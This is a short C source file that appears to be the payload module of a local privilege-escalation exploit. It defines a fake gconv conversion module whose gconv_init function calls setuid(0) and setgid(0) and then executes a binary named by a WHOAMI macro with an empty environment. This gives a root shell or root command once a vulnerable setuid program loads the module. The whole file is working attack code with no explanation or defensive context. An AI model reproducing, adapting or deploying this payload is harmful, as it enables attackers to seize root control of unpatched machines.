#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char * const args[] = { WHOAMI, NULL };
	char * const environ[] = { NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, environ);
	exit(0);
}
